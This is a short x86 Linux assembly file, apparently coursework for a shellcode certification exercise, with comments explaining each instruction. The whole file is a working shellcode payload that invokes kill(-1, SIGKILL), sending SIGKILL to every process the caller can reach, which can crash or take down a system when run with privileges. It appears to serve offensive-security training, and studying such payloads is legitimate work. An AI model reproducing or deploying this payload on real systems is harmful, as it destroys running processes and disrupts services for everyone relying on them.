; John
; Author: Kris Katterjohn
; Polymorphic Shellcode - Assignment 6
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; November 14, 2020

; original size: 11 bytes
; kill(-1, SIGKILL)
; grab SIGKILL value with `man 7 signal`

push byte 37
pop eax         ; eax = sys_kill syscall
push byte -1
pop ebx         ; ebx = 0xff. Send kill() to all processes
push byte 9
pop ecx         ; ecx = 0x9 = SIGKILL
int 0x80
